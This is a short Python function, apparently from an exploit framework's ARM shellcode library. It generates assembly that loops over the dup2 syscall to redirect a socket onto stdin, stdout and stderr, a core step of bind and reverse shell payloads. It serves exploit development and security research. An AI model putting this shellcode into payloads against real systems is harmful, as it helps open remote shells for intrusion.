def generate(sock=4):
    """Duplicates sock to stdin, stdout and stderr

    Args:
        sock(int/str/reg): sock descriptor

    """
    sc = """
    mov r1, #3
    mov r7, #(0+ 63)
    sub r2, r2, r2
    """
    try:
        xsock = int(sock)
        sc += 'mov r5, #%s' % (xsock)
    except:
        sc += 'mov r5, %s' % (sock)
    sc += """
loop_2:
    mov r0, r5
    sub r1, r1, #1
    svc 1
    cmp r1, r2
    bne loop_2
    """
    return sc
